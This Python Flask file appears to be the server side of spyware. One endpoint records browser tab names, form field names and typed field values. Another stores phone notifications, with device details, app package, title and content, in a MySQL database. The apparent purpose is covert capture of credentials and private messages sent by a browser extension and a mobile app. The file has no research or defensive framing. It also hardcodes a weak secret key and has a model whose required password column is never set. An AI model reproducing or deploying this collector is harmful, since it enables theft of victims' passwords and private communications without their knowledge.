from flask import Flask, request, render_template
from datetime import timedelta
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import hashlib
import os
import bcrypt


SQLALCHEMY_DATABASE_URI = "mysql+mysqlconnector://{username}:{password}@{hostname}/{databasename}".format(
    username="username",
    password = "password",
    hostname = "sqlHostName.mysql.pythonanywhere-services.com",
    databasename = "databasename$databasename")


app = Flask(__name__)

app.config['SECRET_KEY'] = 'hello345678900'
app.permanent_session_lifetime = timedelta(minutes=3)
app.config['SQLALCHEMY_DATABASE_URI'] = SQLALCHEMY_DATABASE_URI
app.config["SQLALCHEMY_POOL_RECYCLE"] = 299
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

uploadPath = "/home/chromeservices/mysite/uploads"
app.config['UPLOAD_FOLDER'] = uploadPath

db = SQLAlchemy(app)



class Account(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    time =  db.Column(db.String(200), unique=False, nullable=False)
    tab = db.Column(db.String(200), unique=False, nullable=False)
    field = db.Column(db.String(200), unique=False, nullable=False)
    fieldValue = db.Column(db.String(200), unique=False, nullable=False)

    def __init__(self, time, tab, field, fieldValue):
        self.time = time
        self.tab = tab
        self.field = field
        self.fieldValue = fieldValue




class Notifications(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    time =  db.Column(db.String(200), unique=False, nullable=False)
    password = db.Column(db.String(200), unique=False, nullable=False)
    deviceName =  db.Column(db.String(200), unique=False, nullable=False)
    deviceInfo =  db.Column(db.String(200), unique=False, nullable=False)
    package = db.Column(db.String(200), unique=False, nullable=False)
    title = db.Column(db.String(200), unique=False, nullable=False)
    content = db.Column(db.String(200), unique=False, nullable=False)


    def __init__(self, time, deviceName, deviceInfo, package, title, content):
        self.time = time
        self.deviceName = deviceName
        self.deviceInfo = deviceInfo
        self.package = package
        self.title = title
        self.content = content




@app.route("/chrome", methods=["GET"])
def chrome():
    if request.method == "GET":
        now = datetime.now()
        field = request.args.get('field')
        fieldValue = request.args.get('fieldValue')
        tab = request.args.get("tab")
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

        print("date and time = ", dt_string)
        print("tab is: " + tab)
        print("field is: " + field)
        print("fieldValue is: " + fieldValue)
        if fieldValue != "":
            account = Account(time=dt_string, tab=tab, field=field, fieldValue=fieldValue)
            db.session.add(account)
            db.session.commit()


        return("done")

@app.route("/notifications", methods=["POST"])
def notifications():
    if request.method == "POST":
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        jsonBody = request.get_json()
        deviceName = jsonBody["deviceName"]
        deviceInfo = jsonBody["deviceInfo"]
        package = jsonBody["package"]
        title = jsonBody["title"]
        content = jsonBody["content"]

        notification = Notifications(time=dt_string, deviceName=deviceName, deviceInfo = deviceInfo, package=package, title=title, content=content)
        db.session.add(notification)
        db.session.commit()

        return("successful")




if __name__ == '__main__':
    db.create_all()